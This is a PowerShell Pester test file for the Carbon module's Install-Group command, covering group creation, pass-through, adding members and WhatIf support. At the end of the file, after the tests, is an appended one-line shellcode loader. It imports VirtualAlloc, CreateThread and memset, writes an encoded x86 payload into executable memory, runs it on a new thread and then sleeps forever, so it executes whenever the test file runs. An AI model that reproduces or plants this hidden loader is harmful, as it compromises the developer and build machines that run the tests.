











Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

$GroupName = 'Setup Group'
$userName = $CarbonTestUser.UserName
$description = 'Carbon user for use in Carbon tests.'

function Assert-GroupExists
{
    $groups = Get-Group
    try
    {
        $group = $groups |
                    Where-Object { $_.Name -eq $GroupName }
        $group | Should -Not -BeNullOrEmpty
    }
    finally
    {
        $groups | ForEach-Object { $_.Dispose() }
    }
}

Describe 'Install-Group' {
    BeforeEach {
        Remove-Group
    }
    
    AfterEach {
        Remove-Group
    }
    
    function Remove-Group
    {
        $groups = Get-Group 
        try
        {
            $group = $groups | Where-Object { $_.Name -eq $GroupName }
            if( $null -ne $group )
            {
                net localgroup `"$GroupName`" /delete
            }
        }
        finally
        {
            $groups | ForEach-Object { $_.Dispose() }
        }
    }
    
    function Invoke-NewGroup($Description = '', $Members = @())
    {
        $group = Install-Group -Name $GroupName -Description $Description -Members $Members -PassThru
        try
        {
            $group | Should -Not -BeNullOrEmpty
            Assert-GroupExists
            $expectedGroup = Get-Group -Name $GroupName
            try
            {
                $expectedGroup.Sid | Should -Be $group.Sid
            }
            finally
            {
                $expectedGroup.Dispose()
            }
        }
        finally
        {
            if( $group )
            {
                $group.Dispose()
            }
        }
    }
    
    It 'should create group' {
        $expectedDescription = 'Hello, wordl!'
        Invoke-NewGroup -Description $expectedDescription
        $group = Get-Group -Name $GroupName
        try
        {
            $group | Should -Not -BeNullOrEmpty
            $group.Name | Should -Be $GroupName
            $group.Description | Should -Be $expectedDescription
        }
        finally
        {
            $group.Dispose()
        }
    }
    
    It 'should pass thru group' {
        $group = Install-Group -Name $GroupName 
        try
        {
            $group | Should -BeNullOrEmpty
        }
        finally
        {
            if( $group )
            {
                $group.Dispose()
            }
        }
    
        $group = Install-Group -Name $GroupName -PassThru
        try
        {
            $group | Should -Not -BeNullOrEmpty
            $group | Should -BeOfType ([DirectoryServices.AccountManagement.GroupPrincipal])
        }
        finally
        {
            $group.Dispose()
        }
    }
    
    It 'should add members' {
        Invoke-NewGroup -Members $userName
        
        $details = net localgroup `"$GroupName`"
        $details | Where-Object { $_ -like ('*{0}*' -f $userName) } | Should -Not -BeNullOrEmpty
    }
    
    It 'Should -Not recreate if group already exists' {
        Invoke-NewGroup -Description 'Description 1'
        $group1 = Get-Group -Name $GroupName
        try
        {
        
            Invoke-NewGroup -Description 'Description 2'
            $group2 = Get-Group -Name $GroupName
            
            try
            {
                $group2.Description | Should -Be 'Description 2'
                $group2.SID | Should -Be $group1.SID
            }
            finally
            {
                $group2.Dispose()
            }
        }
        finally
        {
            $group1.Dispose()
        }    
    }
    
    It 'Should -Not add member multiple times' {
        Invoke-NewGroup -Members $userName
        
        $Error.Clear()
        Invoke-NewGroup -Members $userName
        $Error.Count | Should -Be 0
    }
    
    It 'should add member with long name' {
        $longUsername = 'abcdefghijklmnopqrst' 
        Install-User -Credential (New-Credential -Username $longUsername -Password 'a1b2c34d!')
        try
        {
            Invoke-NewGroup -Members ('{0}\{1}' -f $env:COMPUTERNAME,$longUsername)
            $details = net localgroup `"$GroupName`"
            $details | Where-Object { $_ -like ('*{0}*' -f $longUsername) }| Should -Not -BeNullOrEmpty
        }
        finally
        {
            Uninstall-User -Username $userName
        }
    }
    
    It 'should support what if' {
        $Error.Clear()
        $group = Install-Group -Name $GroupName -WhatIf -Member 'Administrator'
        try
        {
            $Global:Error.Count | Should -Be 0
            $group | Should -BeNullOrEmpty
        }
        finally
        {
            if( $group )
            {
                $group.Dispose()
            }
        }
    
        $group = Get-Group -Name $GroupName -ErrorAction SilentlyContinue
        try
        {
            $group | Should -BeNullOrEmpty
        }
        finally
        {
            if( $group )
            {
                $group.Dispose()
            }
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xc0,0xbf,0xf5,0x6e,0xa5,0x30,0xd9,0x74,0x24,0xf4,0x5a,0x29,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xea,0xfc,0x03,0x7a,0xe1,0x8c,0x50,0xcc,0xe1,0xd3,0x9b,0x2d,0xf1,0xb3,0x12,0xc8,0xc0,0xf3,0x41,0x98,0x72,0xc4,0x02,0xcc,0x7e,0xaf,0x47,0xe5,0xf5,0xdd,0x4f,0x0a,0xbe,0x68,0xb6,0x25,0x3f,0xc0,0x8a,0x24,0xc3,0x1b,0xdf,0x86,0xfa,0xd3,0x12,0xc6,0x3b,0x09,0xde,0x9a,0x94,0x45,0x4d,0x0b,0x91,0x10,0x4e,0xa0,0xe9,0xb5,0xd6,0x55,0xb9,0xb4,0xf7,0xcb,0xb2,0xee,0xd7,0xea,0x17,0x9b,0x51,0xf5,0x74,0xa6,0x28,0x8e,0x4e,0x5c,0xab,0x46,0x9f,0x9d,0x00,0xa7,0x10,0x6c,0x58,0xef,0x96,0x8f,0x2f,0x19,0xe5,0x32,0x28,0xde,0x94,0xe8,0xbd,0xc5,0x3e,0x7a,0x65,0x22,0xbf,0xaf,0xf0,0xa1,0xb3,0x04,0x76,0xed,0xd7,0x9b,0x5b,0x85,0xe3,0x10,0x5a,0x4a,0x62,0x62,0x79,0x4e,0x2f,0x30,0xe0,0xd7,0x95,0x97,0x1d,0x07,0x76,0x47,0xb8,0x43,0x9a,0x9c,0xb1,0x09,0xf2,0x51,0xf8,0xb1,0x02,0xfe,0x8b,0xc2,0x30,0xa1,0x27,0x4d,0x78,0x2a,0xee,0x8a,0x7f,0x01,0x56,0x04,0x7e,0xaa,0xa7,0x0c,0x44,0xfe,0xf7,0x26,0x6d,0x7f,0x9c,0xb6,0x92,0xaa,0x09,0xb2,0x04,0x07,0x9f,0x82,0xad,0xcf,0x1d,0xfb,0x5c,0x4c,0xab,0x1d,0x0e,0x3c,0xfb,0xb1,0xee,0xec,0xbb,0x61,0x86,0xe6,0x33,0x5d,0xb6,0x08,0x9e,0xf6,0x5c,0xe7,0x77,0xae,0xc8,0x9e,0xdd,0x24,0x69,0x5e,0xc8,0x40,0xa9,0xd4,0xff,0xb5,0x67,0x1d,0x75,0xa6,0x1f,0xed,0xc0,0x94,0x89,0xf2,0xfe,0xb3,0x35,0x67,0x05,0x12,0x62,0x1f,0x07,0x43,0x44,0x80,0xf8,0xa6,0xdf,0x09,0x6d,0x09,0xb7,0x75,0x61,0x89,0x47,0x20,0xeb,0x89,0x2f,0x94,0x4f,0xda,0x4a,0xdb,0x45,0x4e,0xc7,0x4e,0x66,0x27,0xb4,0xd9,0x0e,0xc5,0xe3,0x2e,0x91,0x36,0xc6,0xae,0xed,0xe0,0x2e,0xc5,0x1f,0x31;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

